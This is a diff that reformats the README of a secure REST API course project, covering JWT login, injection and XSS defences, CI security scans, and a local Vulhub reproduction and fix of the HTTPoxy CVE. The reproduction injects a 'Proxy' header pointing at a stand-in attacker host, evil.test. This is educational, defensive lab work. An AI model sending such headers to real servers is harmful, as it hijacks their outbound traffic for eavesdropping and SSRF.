@@ -1,4 +1,3 @@
-```
 # Work 1: Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis
 
 ## 1. Project Overview
@@ -26,36 +25,33 @@ User authentication endpoint. Returns a JWT access token on valid credentials.
       "username": "admin",
       "password": "Admin#2024!"
   }
-```
-
-- **Success Response (200 OK):**```
-{
-    "access_token": "<jwt_token_string>",
-    "expires_in": 1800,
-    "token_type": "Bearer"
-}
-```
+  ```
+- **Success Response (200 OK):**
+  ```json
+  {
+      "access_token": "<jwt_token_string>",
+      "expires_in": 1800,
+      "token_type": "Bearer"
+  }
+  ```
 - **Failure Response (401 Unauthorized):** Returns error message on wrong credentials.
 
 ### 2.2 GET `/api/data`
-
 Protected endpoint. Returns user data list, **only accessible with valid JWT token**.
-
 - **Request Header:** `Authorization: Bearer <your_token>`
-- **Success Response (200 OK):**```
-{
-    "users": [
-        {"id": 1, "username": "admin"},
-        {"id": 2, "username": "alice"}
-    ]
-}
-```
+- **Success Response (200 OK):**
+  ```json
+  {
+      "users": [
+          {"id": 1, "username": "admin"},
+          {"id": 2, "username": "alice"}
+      ]
+  }
+  ```
 - **Unauthorized Response (401):** Rejects requests with missing or invalid token.
 
 ### 2.3 `/api/notes` (Custom Endpoint)
-
 Note-taking endpoint designed for XSS protection demonstration.
-
 - **POST `/api/notes`**: Create a new note
   - Request Body: `{"content": "note content"}`
   - Response: 201 Created with success message
@@ -67,18 +63,15 @@ Note-taking endpoint designed for XSS protection demonstration.
 ## 3. Implemented Security Measures
 
 ### 3.1 SQL Injection Protection (OWASP A03: Injection)
-
 - **Implementation:** All database operations use **SQLAlchemy ORM with parameterized queries**.
 - **Principle:** User input is passed as query parameters instead of being concatenated directly into SQL strings. The ORM automatically handles escaping and sanitization, eliminating SQL injection attack surfaces.
 - No raw SQL string concatenation is used anywhere in the code.
 
 ### 3.2 XSS Protection (OWASP A03: Injection)
-
 - **Implementation:** All user-controlled output is sanitized with **`markupsafe.escape()`** before being returned in API responses.
 - **Principle:** Special HTML characters (`<`, `>`, `"`, `'`, `&`) are converted to safe HTML entities. Malicious `<script>` tags are rendered as plain text and cannot execute in the browser.
 
 ### 3.3 Broken Authentication Protection (OWASP A07: Identification and Authentication Failures)
-
 1. **JWT Token Authentication**
    - All protected endpoints are decorated with `@jwt_required()`, which automatically validates token signature and expiration.
    - Requests without a valid token are rejected with HTTP 401.
@@ -95,7 +88,6 @@ Note-taking endpoint designed for XSS protection demonstration.
 The pipeline runs automatically on every `push` and `pull_request` to the main branch.
 
 ### 4.1 SAST: Static Application Security Testing (Bandit)
-
 Scans all project source code for insecure coding patterns (hardcoded secrets, dangerous functions, debug mode, etc.)
 
 **Result: 0 security issues (0 High / 0 Medium / 0 Low)**
@@ -103,7 +95,6 @@ Scans all project source code for insecure coding patterns (hardcoded secrets, d
 ![SAST scan result](./images/sast_result.png)
 
 ### 4.2 SCA: Software Composition Analysis (pip-audit)
-
 Scans all installed dependencies for known public CVE vulnerabilities against the PyPA advisory database.
 
 **Result: No known vulnerabilities found**
@@ -111,7 +102,6 @@ Scans all installed dependencies for known public CVE vulnerabilities against th
 ![SCA scan result](./images/sca_result.png)
 
 ### Latest Pipeline Run
-
 [Click to view the latest successful pipeline run](https://github.com/LuXR-coder/secure-api/actions/runs/40296993828)
 
 ---
@@ -120,38 +110,38 @@ Scans all installed dependencies for known public CVE vulnerabilities against th
 
 ### 5.1 Selected Vulnerability
 
-**CVE ID:** CVE-2016-5385 (HTTPoxy CGI Environment Variable Injection)
-**Environment:** Vulhub `cgi/CVE-2016-5385`
+**CVE ID:** CVE-2016-5385 (HTTPoxy CGI Environment Variable Injection)  
+**Environment:** Vulhub `cgi/CVE-2016-5385`  
 **Description:** HTTPoxy is an environment variable injection vulnerability in CGI-compliant web servers. Attackers can inject a malicious `Proxy` HTTP request header, which is automatically mapped to the `HTTP_PROXY` system environment variable by the CGI specification. Backend HTTP client libraries such as Guzzle will read this variable as the system proxy configuration, causing all outbound requests from the server to be hijacked. This leads to risks including traffic eavesdropping, SSRF (Server-Side Request Forgery) and internal network probing.
 
 ### 5.2 Reproduction Steps
 
 1. Clone the Vulhub repository:
-```
-git clone [https://github.com/vulhub/vulhub.git](https://github.com/vulhub/vulhub.git)
-```
+   ```bash
+   git clone https://github.com/vulhub/vulhub.git
+   ```
 
 2. Enter the vulnerability directory:
-```
-cd vulhub/cgi/CVE-2016-5385
-```
+   ```bash
+   cd vulhub/cgi/CVE-2016-5385
+   ```
 
 3. Start the vulnerable environment with Docker Compose:
-```
-docker compose up -d
-```
+   ```bash
+   docker compose up -d
+   ```
 
 4. Verify the environment is running:
-   Access `[http://127.0.0.1:8081/index.php](http://127.0.0.1:8081/index.php)` in the browser. The page normally returns response data from httpbin.org, which confirms the service works properly.
+   Access `http://127.0.0.1:8081/index.php` in the browser. The page normally returns response data from httpbin.org, which confirms the service works properly.
 
-![Vulnerable environment running](./images/cve_env_running.png)
+   ![Vulnerable environment running](./images/cve_env_running.png)
 
 5. Exploit the vulnerability via Postman:
-   - Send a `GET` request to `[http://127.0.0.1:8081/index.php](http://127.0.0.1:8081/index.php)`
-   - Add request header: `Proxy: [http://evil.test:7777](http://evil.test:7777)`
+   - Send a `GET` request to `http://127.0.0.1:8081/index.php`
+   - Add request header: `Proxy: http://evil.test:7777`
    - Result: The backend Guzzle library reads the injected proxy address and attempts to establish a connection, returning a cURL connection timeout / resolution error. This proves the attacker-controlled header has been successfully injected into the system environment and used by the application.
 
-![CVE reproduction successful](./images/cve_reproduce_success.png)
+   ![CVE reproduction successful](./images/cve_reproduce_success.png)
 
 ### 5.3 Root Cause Analysis
 
@@ -184,67 +174,58 @@ fastcgi_param http_proxy "";
 
 After applying the configuration change and restarting the containers:
 
-1.  Resend the exact same attack request with the `Proxy: [http://evil.test:7777](http://evil.test:7777)` header.
+1.  Resend the exact same attack request with the `Proxy: http://evil.test:7777` header.
 2.  The page returns normal httpbin.org response data instead of a cURL proxy connection error. The attack no longer takes effect, and the vulnerability is successfully blocked.
 
-![CVE fix verified](./images/cve_fix_verified.png)
+    ![CVE fix verified](./images/cve_fix_verified.png)
 
 3.  **Regression test:** Normal access without the malicious `Proxy` header still works correctly, and core business functionality is fully preserved.
-```
 
 ---
 
 ## 6. Local Setup Guide
 
 1. Clone the repository
+   ```bash
+   git clone https://github.com/LuXR-coder/secure-api
+   cd secure-api
+   ```
 
-```
-git clone https://github.com/LuXR-coder/secure-api
-cd secure-api
-```
 2. Create virtual environment and install dependencies
+   ```bash
+   python -m venv venv
+   venv\Scripts\activate
+   pip install -r requirements.txt
+   ```
 
-```
-python -m venv venv
-
-venv\Scripts\activate
-
-
-pip install -r requirements.txt
-```
 3. Create `.env` file in root directory
+   ```env
+   JWT_SECRET_KEY=your_custom_secret_key
+   ```
 
-```
-JWT_SECRET_KEY=your_custom_secret_key
-```
 4. Start the server
+   ```bash
+   python app.py
+   ```
+   Service runs at `http://127.0.0.1:5000`
 
-```
-python app.py
-```
-
-Service runs at `[http://127.0.0.1:5000](http://127.0.0.1:5000)`
 5. Run local security scans
+   ```bash
+   # SAST scan
+   bandit app.py
 
-```
-# SAST scan
-bandit app.py
-
-# SCA scan
-pip-audit
-```
+   # SCA scan
+   pip-audit
+   ```
 
 ---
 
 ## References
 
-1. OWASP Top Ten: [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
-2. JWT Introduction: [https://jwt.io/introduction](https://jwt.io/introduction)
-3. GitHub Actions Documentation: [https://docs.github.com/en/actions](https://docs.github.com/en/actions)
-4. Vulhub Official Repository: [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)
-5. NVD: [https://nvd.nist.gov/](https://nvd.nist.gov/)
-6. Docker Documentation: [https://docs.docker.com/](https://docs.docker.com/)
-
+1. OWASP Top Ten: https://owasp.org/www-project-top-ten/
+2. JWT Introduction: https://jwt.io/introduction
+3. GitHub Actions Documentation: https://docs.github.com/en/actions
+4. Vulhub Official Repository: https://github.com/vulhub/vulhub
+5. NVD: https://nvd.nist.gov/
+6. Docker Documentation: https://docs.docker.com/
 ```
-
----
